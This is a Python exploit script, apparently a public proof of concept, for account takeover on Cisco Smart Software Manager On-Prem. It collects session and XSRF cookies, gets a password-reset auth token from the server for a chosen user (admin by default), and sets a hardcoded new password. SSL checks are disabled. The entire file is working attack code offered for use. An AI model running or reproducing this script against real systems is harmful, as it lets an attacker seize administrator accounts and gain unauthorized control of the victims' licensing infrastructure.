
import requests, sys
from urllib.parse import unquote

# Suppress SSL warnings
requests.packages.urllib3.disable_warnings()

Domain = sys.argv[1] # Domain, https://0xpolar.com:8443
Username = sys.argv[2] # Username, by default its [admin]
password = "Polar@123456780"

print("[*] Cisco Smart Software Manager On-Prem")
print("[*] Account Takeover Exploit")
print("[*] Target: "+Domain)
print("[*] Username: "+Username)
print("\n")

print("[*] Getting Necessary Tokens..")
get_url = Domain+"/backend/settings/oauth_adfs?hostname=polar"

response = requests.get(get_url, verify=False)

def get_cookie_value(headers, cookie_name):
    cookies = headers.get('Set-Cookie', '').split(',')
    for cookie in cookies:
        if cookie_name in cookie:
            parts = cookie.split(';')
            for part in parts:
                if cookie_name in part:
                    return part.split('=')[1].strip()
    return None

set_cookie_headers = response.headers.get('Set-Cookie', '')

xsrf_token = get_cookie_value(response.headers, 'XSRF-TOKEN')
lic_engine_session = get_cookie_value(response.headers, '_lic_engine_session')

if xsrf_token:
    xsrf_token = unquote(xsrf_token)

if not lic_engine_session or not xsrf_token:
    print("Required cookies not found in the response.")
else:
    print("[+] lic_engine_session: "+lic_engine_session)
    print("[+] xsrf_token: "+xsrf_token)
    print("\n[*] Generating Auth Token")
    post_url = Domain+"/backend/reset_password/generate_code"

    headers = {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'X-Xsrf-Token': xsrf_token,
        'Sec-Ch-Ua': '',
        'Sec-Ch-Ua-Mobile': '?0',
    }
    cookies = {
        '_lic_engine_session': lic_engine_session,
        'XSRF-TOKEN': xsrf_token,
    }

    payload = {
        'uid': Username
    }

    post_response = requests.post(post_url, headers=headers, cookies=cookies, json=payload, verify=False)

    post_response_json = post_response.json()
    auth_token = post_response_json.get('auth_token')

    if not auth_token:
        print("auth_token not found in the response.")
    else:
        print("[+] Auth Token: "+auth_token)
        print("\n[*] Setting Up a New Password")
        final_post_url = Domain+"/backend/reset_password"

        final_headers = {
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'X-Xsrf-Token': xsrf_token,
        }
        final_cookies = {
            '_lic_engine_session': lic_engine_session,
            'XSRF-TOKEN': xsrf_token,
        }

        final_payload = {
            'uid': Username,
            'auth_token': auth_token,
            'password': password,
            'password_confirmation': password,
            'common_name': ''
        }
    
        final_post_response = requests.post(final_post_url, headers=final_headers, cookies=final_cookies, json=final_payload, verify=False)
        response_text = final_post_response.text

        if "OK" in response_text:
            print("[+] Password Successfully Changed!")
            print("[+] Username: "+Username)
            print("[+] New Password: "+password)
        else:
            print("[!] Something Went Wrong")
            print(response_text)
